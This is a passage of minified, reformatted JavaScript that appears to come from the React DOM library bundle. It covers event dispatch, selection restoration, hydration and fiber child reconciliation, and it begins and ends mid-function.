            for (; n;) {
                if (n.nextSibling) {
                    n = n.nextSibling;
                    break e
                }
                n = n.parentNode
            }
            n = void 0
        }
        n = sa(n)
    }
}

function ud(e, t) {
    return !(!e || !t) && (e === t || (!e || 3 !== e.nodeType) && (t && 3 === t.nodeType ? ud(e, t.parentNode) : "contains" in e ? e.contains(t) : !!e.compareDocumentPosition && !!(16 & e.compareDocumentPosition(t))))
}

function ad() {
    for (var e = window, t = Vo(); t instanceof e.HTMLIFrameElement;) {
        try {
            var n = "string" == typeof t.contentWindow.location.href
        } catch {
            n = !1
        }
        if (!n) break;
        t = Vo((e = t.contentWindow).document)
    }
    return t
}

function qs(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t && ("input" === t && ("text" === e.type || "search" === e.type || "tel" === e.type || "url" === e.type || "password" === e.type) || "textarea" === t || "true" === e.contentEditable)
}

function vh(e) {
    var t = ad(),
        n = e.focusedElem,
        r = e.selectionRange;
    if (t !== n && n && n.ownerDocument && ud(n.ownerDocument.documentElement, n)) {
        if (null !== r && qs(n))
            if (t = r.start, void 0 === (e = r.end) && (e = t), "selectionStart" in n) n.selectionStart = t, n.selectionEnd = Math.min(e, n.value.length);
            else if ((e = (t = n.ownerDocument || document) && t.defaultView || window).getSelection) {
                e = e.getSelection();
                var o = n.textContent.length,
                    l = Math.min(r.start, o);
                r = void 0 === r.end ? l : Math.min(r.end, o), !e.extend && l > r && (o = r, r = l, l = o), o = ua(n, l);
                var i = ua(n, r);
                o && i && (1 !== e.rangeCount || e.anchorNode !== o.node || e.anchorOffset !== o.offset || e.focusNode !== i.node || e.focusOffset !== i.offset) && ((t = t.createRange()).setStart(o.node, o.offset), e.removeAllRanges(), l > r ? (e.addRange(t), e.extend(i.node, i.offset)) : (t.setEnd(i.node, i.offset), e.addRange(t)))
            }
        for (t = [], e = n; e = e.parentNode;) 1 === e.nodeType && t.push({
            element: e,
            left: e.scrollLeft,
            top: e.scrollTop
        });
        for ("function" == typeof n.focus && n.focus(), n = 0; n < t.length; n++)(e = t[n]).element.scrollLeft = e.left, e.element.scrollTop = e.top
    }
}
var gh = st && "documentMode" in document && 11 >= document.documentMode,
    mn = null,
    Ki = null,
    ar = null,
    Qi = !1;

function aa(e, t, n) {
    var r = n.window === n ? n.document : 9 === n.nodeType ? n : n.ownerDocument;
    Qi || null == mn || mn !== Vo(r) || ("selectionStart" in (r = mn) && qs(r) ? r = {
        start: r.selectionStart,
        end: r.selectionEnd
    } : r = {
        anchorNode: (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection()).anchorNode,
        anchorOffset: r.anchorOffset,
        focusNode: r.focusNode,
        focusOffset: r.focusOffset
    }, ar && Sr(ar, r) || (ar = r, 0 < (r = Ko(Ki, "onSelect")).length && (t = new Xs("onSelect", "select", null, t, n), e.push({
        event: t,
        listeners: r
    }), t.target = mn)))
}

function io(e, t) {
    var n = {};
    return n[e.toLowerCase()] = t.toLowerCase(), n["Webkit" + e] = "webkit" + t, n["Moz" + e] = "moz" + t, n
}
var hn = {
    animationend: io("Animation", "AnimationEnd"),
    animationiteration: io("Animation", "AnimationIteration"),
    animationstart: io("Animation", "AnimationStart"),
    transitionend: io("Transition", "TransitionEnd")
},
    ii = {},
    cd = {};

function xl(e) {
    if (ii[e]) return ii[e];
    if (!hn[e]) return e;
    var n, t = hn[e];
    for (n in t)
        if (t.hasOwnProperty(n) && n in cd) return ii[e] = t[n];
    return e
}
st && (cd = document.createElement("div").style, "AnimationEvent" in window || (delete hn.animationend.animation, delete hn.animationiteration.animation, delete hn.animationstart.animation), "TransitionEvent" in window || delete hn.transitionend.transition);
var dd = xl("animationend"),
    fd = xl("animationiteration"),
    pd = xl("animationstart"),
    md = xl("transitionend"),
    hd = new Map,
    ca = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");

function At(e, t) {
    hd.set(e, t), on(t, [e])
}
for (var si = 0; si < ca.length; si++) {
    var ui = ca[si],
        yh = ui.toLowerCase(),
        wh = ui[0].toUpperCase() + ui.slice(1);
    At(yh, "on" + wh)
}
At(dd, "onAnimationEnd"), At(fd, "onAnimationIteration"), At(pd, "onAnimationStart"), At("dblclick", "onDoubleClick"), At("focusin", "onFocus"), At("focusout", "onBlur"), At(md, "onTransitionEnd"), In("onMouseEnter", ["mouseout", "mouseover"]), In("onMouseLeave", ["mouseout", "mouseover"]), In("onPointerEnter", ["pointerout", "pointerover"]), In("onPointerLeave", ["pointerout", "pointerover"]), on("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")), on("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")), on("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]), on("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")), on("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")), on("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
var nr = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),
    xh = new Set("cancel close invalid load scroll toggle".split(" ").concat(nr));

function da(e, t, n) {
    var r = e.type || "unknown-event";
    e.currentTarget = n, ym(r, t, void 0, e), e.currentTarget = null
}

function vd(e, t) {
    t = !!(4 & t);
    for (var n = 0; n < e.length; n++) {
        var r = e[n],
            o = r.event;
        r = r.listeners;
        e: {
            var l = void 0;
            if (t)
                for (var i = r.length - 1; 0 <= i; i--) {
                    var s = r[i],
                        u = s.instance,
                        a = s.currentTarget;
                    if (s = s.listener, u !== l && o.isPropagationStopped()) break e;
                    da(o, s, a), l = u
                } else
                for (i = 0; i < r.length; i++) {
                    if (u = (s = r[i]).instance, a = s.currentTarget, s = s.listener, u !== l && o.isPropagationStopped()) break e;
                    da(o, s, a), l = u
                }
        }
    }
    if (bo) throw e = Wi, bo = !1, Wi = null, e
}

function b(e, t) {
    var n = t[qi];
    void 0 === n && (n = t[qi] = new Set);
    var r = e + "__bubble";
    n.has(r) || (gd(t, e, 2, !1), n.add(r))
}

function ai(e, t, n) {
    var r = 0;
    t && (r |= 4), gd(n, e, r, t)
}
var so = "_reactListening" + Math.random().toString(36).slice(2);

function _r(e) {
    if (!e[so]) {
        e[so] = !0, kc.forEach((function (n) {
            "selectionchange" !== n && (xh.has(n) || ai(n, !1, e), ai(n, !0, e))
        }));
        var t = 9 === e.nodeType ? e : e.ownerDocument;
        null === t || t[so] || (t[so] = !0, ai("selectionchange", !1, t))
    }
}

function gd(e, t, n, r) {
    switch (ed(t)) {
        case 1:
            var o = Lm;
            break;
        case 4:
            o = Mm;
            break;
        default:
            o = Qs
    }
    n = o.bind(null, t, n, e), o = void 0, !bi || "touchstart" !== t && "touchmove" !== t && "wheel" !== t || (o = !0), r ? void 0 !== o ? e.addEventListener(t, n, {
        capture: !0,
        passive: o
    }) : e.addEventListener(t, n, !0) : void 0 !== o ? e.addEventListener(t, n, {
        passive: o
    }) : e.addEventListener(t, n, !1)
}

function ci(e, t, n, r, o) {
    var l = r;
    if (!(1 & t || 2 & t || null === r)) e: for (; ;) {
        if (null === r) return;
        var i = r.tag;
        if (3 === i || 4 === i) {
            var s = r.stateNode.containerInfo;
            if (s === o || 8 === s.nodeType && s.parentNode === o) break;
            if (4 === i)
                for (i = r.return; null !== i;) {
                    var u = i.tag;
                    if ((3 === u || 4 === u) && ((u = i.stateNode.containerInfo) === o || 8 === u.nodeType && u.parentNode === o)) return;
                    i = i.return
                }
            for (; null !== s;) {
                if (null === (i = Bt(s))) return;
                if (5 === (u = i.tag) || 6 === u) {
                    r = l = i;
                    continue e
                }
                s = s.parentNode
            }
        }
        r = r.return
    }
    Vc((function () {
        var a = l,
            c = Hs(n),
            p = [];
        e: {
            var m = hd.get(e);
            if (void 0 !== m) {
                var g = Xs,
                    w = e;
                switch (e) {
                    case "keypress":
                        if (0 === To(n)) break e;
                    case "keydown":
                    case "keyup":
                        g = Xm;
                        break;
                    case "focusin":
                        w = "focus", g = ri;
                        break;
                    case "focusout":
                        w = "blur", g = ri;
                        break;
                    case "beforeblur":
                    case "afterblur":
                        g = ri;
                        break;
                    case "click":
                        if (2 === n.button) break e;
                    case "auxclick":
                    case "dblclick":
                    case "mousedown":
                    case "mousemove":
                    case "mouseup":
                    case "mouseout":
                    case "mouseover":
                    case "contextmenu":
                        g = qu;
                        break;
                    case "drag":
                    case "dragend":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "dragstart":
                    case "drop":
                        g = Dm;
                        break;
                    case "touchcancel":
                    case "touchend":
                    case "touchmove":
                    case "touchstart":
                        g = qm;
                        break;
                    case dd:
                    case fd:
                    case pd:
                        g = Um;
                        break;
                    case md:
                        g = th;
                        break;
                    case "scroll":
                        g = Am;
                        break;
                    case "wheel":
                        g = rh;
                        break;
                    case "copy":
                    case "cut":
                    case "paste":
                        g = Wm;
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "pointerup":
                        g = ta
                }
                var y = !!(4 & t),
                    S = !y && "scroll" === e,
                    f = y ? null !== m ? m + "Capture" : null : m;
                y = [];
                for (var h, d = a; null !== d;) {
                    var _ = (h = d).stateNode;
                    if (5 === h.tag && null !== _ && (h = _, null !== f && (null != (_ = vr(d, f)) && y.push(Er(d, _, h)))), S) break;
                    d = d.return
                }
                0 < y.length && (m = new g(m, w, null, n, c), p.push({
                    event: m,
                    listeners: y
                }))
            }
        }
        if (!(7 & t)) {
            if (g = "mouseout" === e || "pointerout" === e, (!(m = "mouseover" === e || "pointerover" === e) || n === Vi || !(w = n.relatedTarget || n.fromElement) || !Bt(w) && !w[ut]) && (g || m) && (m = c.window === c ? c : (m = c.ownerDocument) ? m.defaultView || m.parentWindow : window, g ? (g = a, null !== (w = (w = n.relatedTarget || n.toElement) ? Bt(w) : null) && (w !== (S = ln(w)) || 5 !== w.tag && 6 !== w.tag) && (w = null)) : (g = null, w = a), g !== w)) {
                if (y = qu, _ = "onMouseLeave", f = "onMouseEnter", d = "mouse", ("pointerout" === e || "pointerover" === e) && (y = ta, _ = "onPointerLeave", f = "onPointerEnter", d = "pointer"), S = null == g ? m : vn(g), h = null == w ? m : vn(w), (m = new y(_, d + "leave", g, n, c)).target = S, m.relatedTarget = h, _ = null, Bt(c) === a && ((y = new y(f, d + "enter", w, n, c)).target = h, y.relatedTarget = S, _ = y), S = _, g && w) t: {
                    for (f = w, d = 0, h = y = g; h; h = cn(h)) d++;
                    for (h = 0, _ = f; _; _ = cn(_)) h++;
                    for (; 0 < d - h;) y = cn(y),
                        d--;
                    for (; 0 < h - d;) f = cn(f),
                        h--;
                    for (; d--;) {
                        if (y === f || null !== f && y === f.alternate) break t;
                        y = cn(y), f = cn(f)
                    }
                    y = null
                }
                else y = null;
                null !== g && fa(p, m, g, y, !1), null !== w && null !== S && fa(p, S, w, y, !0)
            }
            if ("select" === (g = (m = a ? vn(a) : window).nodeName && m.nodeName.toLowerCase()) || "input" === g && "file" === m.type) var k = ch;
            else if (oa(m))
                if (id) k = mh;
                else {
                    k = fh;
                    var I = dh
                }
            else (g = m.nodeName) && "input" === g.toLowerCase() && ("checkbox" === m.type || "radio" === m.type) && (k = ph);
            switch (k && (k = k(e, a)) ? ld(p, k, n, c) : (I && I(e, m, a), "focusout" === e && (I = m._wrapperState) && I.controlled && "number" === m.type && Mi(m, "number", m.value)), I = a ? vn(a) : window, e) {
                case "focusin":
                    (oa(I) || "true" === I.contentEditable) && (mn = I, Ki = a, ar = null);
                    break;
                case "focusout":
                    ar = Ki = mn = null;
                    break;
                case "mousedown":
                    Qi = !0;
                    break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                    Qi = !1, aa(p, n, c);
                    break;
                case "selectionchange":
                    if (gh) break;
                case "keydown":
                case "keyup":
                    aa(p, n, c)
            }
            var T;
            if (Zs) e: {
                switch (e) {
                    case "compositionstart":
                        var C = "onCompositionStart";
                        break e;
                    case "compositionend":
                        C = "onCompositionEnd";
                        break e;
                    case "compositionupdate":
                        C = "onCompositionUpdate";
                        break e
                }
                C = void 0
            }
            else pn ? rd(e, n) && (C = "onCompositionEnd") : "keydown" === e && 229 === n.keyCode && (C = "onCompositionStart");
            C && (nd && "ko" !== n.locale && (pn || "onCompositionStart" !== C ? "onCompositionEnd" === C && pn && (T = td()) : (Ys = "value" in (Et = c) ? Et.value : Et.textContent, pn = !0)), 0 < (I = Ko(a, C)).length && (C = new ea(C, e, null, n, c), p.push({
                event: C,
                listeners: I
            }), T ? C.data = T : null !== (T = od(n)) && (C.data = T))), (T = lh ? ih(e, n) : sh(e, n)) && (0 < (a = Ko(a, "onBeforeInput")).length && (c = new ea("onBeforeInput", "beforeinput", null, n, c), p.push({
                event: c,
                listeners: a
            }), c.data = T))
        }
        vd(p, t)
    }))
}

function Er(e, t, n) {
    return {
        instance: e,
        listener: t,
        currentTarget: n
    }
}

function Ko(e, t) {
    for (var n = t + "Capture", r = []; null !== e;) {
        var o = e,
            l = o.stateNode;
        5 === o.tag && null !== l && (o = l, null != (l = vr(e, n)) && r.unshift(Er(e, l, o)), null != (l = vr(e, t)) && r.push(Er(e, l, o))), e = e.return
    }
    return r
}

function cn(e) {
    if (null === e) return null;
    do {
        e = e.return
    } while (e && 5 !== e.tag);
    return e || null
}

function fa(e, t, n, r, o) {
    for (var l = t._reactName, i = []; null !== n && n !== r;) {
        var s = n,
            u = s.alternate,
            a = s.stateNode;
        if (null !== u && u === r) break;
        5 === s.tag && null !== a && (s = a, o ? null != (u = vr(n, l)) && i.unshift(Er(n, u, s)) : o || null != (u = vr(n, l)) && i.push(Er(n, u, s))), n = n.return
    }
    0 !== i.length && e.push({
        event: t,
        listeners: i
    })
}
var Sh = /\r\n?/g,
    _h = /\u0000|\uFFFD/g;

function pa(e) {
    return ("string" == typeof e ? e : "" + e).replace(Sh, "\n").replace(_h, "")
}

function uo(e, t, n) {
    if (t = pa(t), pa(e) !== t && n) throw Error(E(425))
}

function Qo() { }
var Yi = null,
    Xi = null;

function Ji(e, t) {
    return "textarea" === e || "noscript" === e || "string" == typeof t.children || "number" == typeof t.children || "object" == typeof t.dangerouslySetInnerHTML && null !== t.dangerouslySetInnerHTML && null != t.dangerouslySetInnerHTML.__html
}
var Zi = "function" == typeof setTimeout ? setTimeout : void 0,
    Eh = "function" == typeof clearTimeout ? clearTimeout : void 0,
    ma = "function" == typeof Promise ? Promise : void 0,
    kh = "function" == typeof queueMicrotask ? queueMicrotask : typeof ma < "u" ? function (e) {
        return ma.resolve(null).then(e).catch(Ch)
    } : Zi;

function Ch(e) {
    setTimeout((function () {
        throw e
    }))
}

function di(e, t) {
    var n = t,
        r = 0;
    do {
        var o = n.nextSibling;
        if (e.removeChild(n), o && 8 === o.nodeType)
            if ("/$" === (n = o.data)) {
                if (0 === r) return e.removeChild(o), void wr(t);
                r--
            } else "$" !== n && "$?" !== n && "$!" !== n || r++;
        n = o
    } while (n);
    wr(t)
}

function Tt(e) {
    for (; null != e; e = e.nextSibling) {
        var t = e.nodeType;
        if (1 === t || 3 === t) break;
        if (8 === t) {
            if ("$" === (t = e.data) || "$!" === t || "$?" === t) break;
            if ("/$" === t) return null
        }
    }
    return e
}

function ha(e) {
    e = e.previousSibling;
    for (var t = 0; e;) {
        if (8 === e.nodeType) {
            var n = e.data;
            if ("$" === n || "$!" === n || "$?" === n) {
                if (0 === t) return e;
                t--
            } else "/$" === n && t++
        }
        e = e.previousSibling
    }
    return null
}
var Un = Math.random().toString(36).slice(2),
    Xe = "__reactFiber$" + Un,
    kr = "__reactProps$" + Un,
    ut = "__reactContainer$" + Un,
    qi = "__reactEvents$" + Un,
    Nh = "__reactListeners$" + Un,
    Ph = "__reactHandles$" + Un;

function Bt(e) {
    var t = e[Xe];
    if (t) return t;
    for (var n = e.parentNode; n;) {
        if (t = n[ut] || n[Xe]) {
            if (n = t.alternate, null !== t.child || null !== n && null !== n.child)
                for (e = ha(e); null !== e;) {
                    if (n = e[Xe]) return n;
                    e = ha(e)
                }
            return t
        }
        n = (e = n).parentNode
    }
    return null
}

function Fr(e) {
    return !(e = e[Xe] || e[ut]) || 5 !== e.tag && 6 !== e.tag && 13 !== e.tag && 3 !== e.tag ? null : e
}

function vn(e) {
    if (5 === e.tag || 6 === e.tag) return e.stateNode;
    throw Error(E(33))
}

function Sl(e) {
    return e[kr] || null
}
var es = [],
    gn = -1;

function $t(e) {
    return {
        current: e
    }
}

function W(e) {
    0 > gn || (e.current = es[gn], es[gn] = null, gn--)
}

function V(e, t) {
    gn++, es[gn] = e.current, e.current = t
}
var Lt = {},
    ce = $t(Lt),
    ye = $t(!1),
    Jt = Lt;

function Rn(e, t) {
    var n = e.type.contextTypes;
    if (!n) return Lt;
    var r = e.stateNode;
    if (r && r.__reactInternalMemoizedUnmaskedChildContext === t) return r.__reactInternalMemoizedMaskedChildContext;
    var l, o = {};
    for (l in n) o[l] = t[l];
    return r && ((e = e.stateNode).__reactInternalMemoizedUnmaskedChildContext = t, e.__reactInternalMemoizedMaskedChildContext = o), o
}

function we(e) {
    return null != (e = e.childContextTypes)
}

function Yo() {
    W(ye), W(ce)
}

function va(e, t, n) {
    if (ce.current !== Lt) throw Error(E(168));
    V(ce, t), V(ye, n)
}

function yd(e, t, n) {
    var r = e.stateNode;
    if (t = t.childContextTypes, "function" != typeof r.getChildContext) return n;
    for (var o in r = r.getChildContext())
        if (!(o in t)) throw Error(E(108, dm(e) || "Unknown", o));
    return Q({}, n, r)
}

function Xo(e) {
    return e = (e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext || Lt, Jt = ce.current, V(ce, e), V(ye, ye.current), !0
}

function ga(e, t, n) {
    var r = e.stateNode;
    if (!r) throw Error(E(169));
    n ? (e = yd(e, t, Jt), r.__reactInternalMemoizedMergedChildContext = e, W(ye), W(ce), V(ce, e)) : W(ye), V(ye, n)
}
var nt = null,
    _l = !1,
    fi = !1;

function wd(e) {
    null === nt ? nt = [e] : nt.push(e)
}

function Th(e) {
    _l = !0, wd(e)
}

function Dt() {
    if (!fi && null !== nt) {
        fi = !0;
        var e = 0,
            t = $;
        try {
            var n = nt;
            for ($ = 1; e < n.length; e++) {
                var r = n[e];
                do {
                    r = r(!0)
                } while (null !== r)
            }
            nt = null, _l = !1
        } catch (o) {
            throw null !== nt && (nt = nt.slice(e + 1)), Hc(Bs, Dt), o
        } finally {
            $ = t, fi = !1
        }
    }
    return null
}
var yn = [],
    wn = 0,
    Jo = null,
    Zo = 0,
    je = [],
    Oe = 0,
    Zt = null,
    rt = 1,
    ot = "";

function bt(e, t) {
    yn[wn++] = Zo, yn[wn++] = Jo, Jo = e, Zo = t
}

function xd(e, t, n) {
    je[Oe++] = rt, je[Oe++] = ot, je[Oe++] = Zt, Zt = e;
    var r = rt;
    e = ot;
    var o = 32 - be(r) - 1;
    r &= ~(1 << o), n += 1;
    var l = 32 - be(t) + o;
    if (30 < l) {
        var i = o - o % 5;
        l = (r & (1 << i) - 1).toString(32), r >>= i, o -= i, rt = 1 << 32 - be(t) + o | n << o | r, ot = l + e
    } else rt = 1 << l | n << o | r, ot = e
}

function eu(e) {
    null !== e.return && (bt(e, 1), xd(e, 1, 0))
}

function tu(e) {
    for (; e === Jo;) Jo = yn[--wn], yn[wn] = null, Zo = yn[--wn], yn[wn] = null;
    for (; e === Zt;) Zt = je[--Oe], je[Oe] = null, ot = je[--Oe], je[Oe] = null, rt = je[--Oe], je[Oe] = null
}
var Ce = null,
    Ee = null,
    H = !1,
    Ve = null;

function Sd(e, t) {
    var n = ze(5, null, null, 0);
    n.elementType = "DELETED", n.stateNode = t, n.return = e, null === (t = e.deletions) ? (e.deletions = [n], e.flags |= 16) : t.push(n)
}

function ya(e, t) {
    switch (e.tag) {
        case 5:
            var n = e.type;
            return null !== (t = 1 !== t.nodeType || n.toLowerCase() !== t.nodeName.toLowerCase() ? null : t) && (e.stateNode = t, Ce = e, Ee = Tt(t.firstChild), !0);
        case 6:
            return null !== (t = "" === e.pendingProps || 3 !== t.nodeType ? null : t) && (e.stateNode = t, Ce = e, Ee = null, !0);
        case 13:
            return null !== (t = 8 !== t.nodeType ? null : t) && (n = null !== Zt ? {
                id: rt,
                overflow: ot
            } : null, e.memoizedState = {
                dehydrated: t,
                treeContext: n,
                retryLane: 1073741824
            }, (n = ze(18, null, null, 0)).stateNode = t, n.return = e, e.child = n, Ce = e, Ee = null, !0);
        default:
            return !1
    }
}

function ts(e) {
    return !(!(1 & e.mode) || 128 & e.flags)
}

function ns(e) {
    if (H) {
        var t = Ee;
        if (t) {
            var n = t;
            if (!ya(e, t)) {
                if (ts(e)) throw Error(E(418));
                t = Tt(n.nextSibling);
                var r = Ce;
                t && ya(e, t) ? Sd(r, n) : (e.flags = -4097 & e.flags | 2, H = !1, Ce = e)
            }
        } else {
            if (ts(e)) throw Error(E(418));
            e.flags = -4097 & e.flags | 2, H = !1, Ce = e
        }
    }
}

function wa(e) {
    for (e = e.return; null !== e && 5 !== e.tag && 3 !== e.tag && 13 !== e.tag;) e = e.return;
    Ce = e
}

function ao(e) {
    if (e !== Ce) return !1;
    if (!H) return wa(e), H = !0, !1;
    var t;
    if ((t = 3 !== e.tag) && !(t = 5 !== e.tag) && (t = "head" !== (t = e.type) && "body" !== t && !Ji(e.type, e.memoizedProps)), t && (t = Ee)) {
        if (ts(e)) throw _d(), Error(E(418));
        for (; t;) Sd(e, t), t = Tt(t.nextSibling)
    }
    if (wa(e), 13 === e.tag) {
        if (!(e = null !== (e = e.memoizedState) ? e.dehydrated : null)) throw Error(E(317));
        e: {
            for (e = e.nextSibling, t = 0; e;) {
                if (8 === e.nodeType) {
                    var n = e.data;
                    if ("/$" === n) {
                        if (0 === t) {
                            Ee = Tt(e.nextSibling);
                            break e
                        }
                        t--
                    } else "$" !== n && "$!" !== n && "$?" !== n || t++
                }
                e = e.nextSibling
            }
            Ee = null
        }
    } else Ee = Ce ? Tt(e.stateNode.nextSibling) : null;
    return !0
}

function _d() {
    for (var e = Ee; e;) e = Tt(e.nextSibling)
}

function jn() {
    Ee = Ce = null, H = !1
}

function nu(e) {
    null === Ve ? Ve = [e] : Ve.push(e)
}
var Ih = pt.ReactCurrentBatchConfig;

function Qn(e, t, n) {
    if (null !== (e = n.ref) && "function" != typeof e && "object" != typeof e) {
        if (n._owner) {
            if (n = n._owner) {
                if (1 !== n.tag) throw Error(E(309));
                var r = n.stateNode
            }
            if (!r) throw Error(E(147, e));
            var o = r,
                l = "" + e;
            return null !== t && null !== t.ref && "function" == typeof t.ref && t.ref._stringRef === l ? t.ref : ((t = function (i) {
                var s = o.refs;
                null === i ? delete s[l] : s[l] = i
            })._stringRef = l, t)
        }
        if ("string" != typeof e) throw Error(E(284));
        if (!n._owner) throw Error(E(290, e))
    }
    return e
}

function co(e, t) {
    throw e = Object.prototype.toString.call(t), Error(E(31, "[object Object]" === e ? "object with keys {" + Object.keys(t).join(", ") + "}" : e))
}

function xa(e) {
    return (0, e._init)(e._payload)
}

function Ed(e) {
    function t(f, d) {
        if (e) {
            var h = f.deletions;
            null === h ? (f.deletions = [d], f.flags |= 16) : h.push(d)
        }
    }

    function n(f, d) {
        if (!e) return null;
        for (; null !== d;) t(f, d), d = d.sibling;
        return null
    }

    function r(f, d) {
        for (f = new Map; null !== d;) null !== d.key ? f.set(d.key, d) : f.set(d.index, d), d = d.sibling;
        return f
    }

    function o(f, d) {
        return (f = Ot(f, d)).index = 0, f.sibling = null, f
    }

    function l(f, d, h) {
        return f.index = h, e ? null !== (h = f.alternate) ? (h = h.index) < d ? (f.flags |= 2, d) : h : (f.flags |= 2, d) : (f.flags |= 1048576, d)
    }

    function i(f) {
        return e && null === f.alternate && (f.flags |= 2), f
    }

    function s(f, d, h, _) {
        return null === d || 6 !== d.tag ? ((d = wi(h, f.mode, _)).return = f, d) : ((d = o(d, h)).return = f, d)
    }

    function u(f, d, h, _) {
        var k = h.type;
        return k === fn ? c(f, d, h.props.children, _, h.key) : null !== d && (d.elementType === k || "object" == typeof k && null !== k && k.$$typeof === yt && xa(k) === d.type) ? ((_ = o(d, h.props)).ref = Qn(f, d, h), _.return = f, _) : ((_ = Mo(h.type, h.key, h.props, null, f.mode, _)).ref = Qn(f, d, h), _.return = f, _)
    }

    function a(f, d, h, _) {
        return null === d || 4 !== d.tag || d.stateNode.containerInfo !== h.containerInfo || d.stateNode.implementation !== h.implementation ? ((d = xi(h, f.mode, _)).return = f, d) : ((d = o(d, h.children || [])).return = f, d)
    }

    function c(f, d, h, _, k) {
        return null === d || 7 !== d.tag ? ((d = Xt(h, f.mode, _, k)).return = f, d) : ((d = o(d, h)).return = f, d)
    }

    function p(f, d, h) {
        if ("string" == typeof d && "" !== d || "number" == typeof d) return (d = wi("" + d, f.mode, h)).return = f, d;
        if ("object" == typeof d && null !== d) {
            switch (d.$$typeof) {
                case qr:
                    return (h = Mo(d.type, d.key, d.props, null, f.mode, h)).ref = Qn(f, null, d), h.return = f, h;
                case dn:
                    return (d = xi(d, f.mode, h)).return = f, d;
                case yt:
                    return p(f, (0, d._init)(d._payload), h)
            }
            if (er(d) || Wn(d)) return (d = Xt(d, f.mode, h, null)).return = f, d;
            co(f, d)
        }
        return null
    }

    function m(f, d, h, _) {
        var k = null !== d ? d.key : null;
        if ("string" == typeof h && "" !== h || "number" == typeof h) return null !== k ? null : s(f, d, "" + h, _);
        if ("object" == typeof h && null !== h) {
            switch (h.$$typeof) {
                case qr:
                    return h.key === k ? u(f, d, h, _) : null;
                case dn:
                    return h.key === k ? a(f, d, h, _) : null;
                case yt:
                    return m(f, d, (k = h._init)(h._payload), _)
            }
            if (er(h) || Wn(h)) return null !== k ? null : c(f, d, h, _, null);
            co(f, h)
        }
        return null
    }

    function g(f, d, h, _, k) {
        if ("string" == typeof _ && "" !== _ || "number" == typeof _) return s(d, f = f.get(h) || null, "" + _, k);
        if ("object" == typeof _ && null !== _) {
            switch (_.$$typeof) {
                case qr:
                    return u(d, f = f.get(null === _.key ? h : _.key) || null, _, k);
                case dn:
                    return a(d, f = f.get(null === _.key ? h : _.key) || null, _, k);
                case yt:
                    return g(f, d, h, (0, _._init)(_._payload), k)
            }
            if (er(_) || Wn(_)) return c(d, f = f.get(h) || null, _, k, null);
            co(d, _)
        }
        return null
    }
    return function S(f, d, h, _) {
        if ("object" == typeof h && null !== h && h.type === fn && null === h.key && (h = h.props.children), "object" == typeof h && null !== h) {
            switch (h.$$typeof) {
                case qr:
                    e: {
                        for (var k = h.key, I = d; null !== I;) {
                            if (I.key === k) {
                                if ((k = h.type) === fn) {
                                    if (7 === I.tag) {
                                        n(f, I.sibling), (d = o(I, h.props.children)).return = f, f = d;
                                        break e
                                    }
                                } else if (I.elementType === k || "object" == typeof k && null !== k && k.$$typeof === yt && xa(k) === I.type) {
                                    n(f, I.sibling), (d = o(I, h.props)).ref = Qn(f, I, h), d.return = f, f = d;
                                    break e
                                }
                                n(f, I);
                                break
                            }
                            t(f, I), I = I.sibling
                        }
                        h.type === fn ? ((d = Xt(h.props.children, f.mode, _, h.key)).return = f, f = d) : ((_ = Mo(h.type, h.key, h.props, null, f.mode, _)).ref = Qn(f, d, h), _.return = f, f = _)
                    }
                    return i(f);
                case dn:
                    e: {
                        for (I = h.key; null !== d;) {
                            if (d.key === I) {
                                if (4 === d.tag && d.stateNode.containerInfo === h.containerInfo && d.stateNode.implementation === h.implementation) {
                                    n(f, d.sibling), (d = o(d, h.children || [])).return = f, f = d;
                                    break e
                                }
                                n(f, d);
                                break
                            }
                            t(f, d), d = d.sibling
                        } (d = xi(h, f.mode, _)).return = f,
                            f = d
                    }
                    return i(f);
                case yt:
                    return S(f, d, (I = h._init)(h._payload), _)
            }
            if (er(h)) return function w(f, d, h, _) {
                for (var k = null, I = null, T = d, C = d = 0, D = null; null !== T && C < h.length; C++) {
                    T.index > C ? (D = T, T = null) : D = T.sibling;
                    var j = m(f, T, h[C], _);
                    if (null === j) {
                        null === T && (T = D);
                        break
                    }
                    e && T && null === j.alternate && t(f, T), d = l(j, d, C), null === I ? k = j : I.sibling = j, I = j, T = D
                }
                if (C === h.length) return n(f, T), H && bt(f, C), k;
                if (null === T) {
                    for (; C < h.length; C++) null !== (T = p(f, h[C], _)) && (d = l(T, d, C), null === I ? k = T : I.sibling = T, I = T);
                    return H && bt(f, C), k
                }
                for (T = r(f, T); C < h.length; C++) null !== (D = g(T, f, C, h[C], _)) && (e && null !== D.alternate && T.delete(null === D.key ? C : D.key), d = l(D, d, C), null === I ? k = D : I.sibling = D, I = D);
                return e && T.forEach((function (Z) {
                    return t(f, Z)
                })), H && bt(f, C), k
            }(f, d, h, _);
            if (Wn(h)) return function y(f, d, h, _) {
                var k = Wn(h);
                if ("function" != typeof k) throw Error(E(150));
                if (null == (h = k.call(h))) throw Error(E(151));
                for (var I = k = null, T = d, C = d = 0, D = null, j = h.next(); null !== T && !j.done; C++, j = h.next()) {
                    T.index > C ? (D = T, T = null) : D = T.sibling;
                    var Z = m(f, T, j.value, _);
                    if (null === Z) {
                        null === T && (T = D);
                        break
                    }
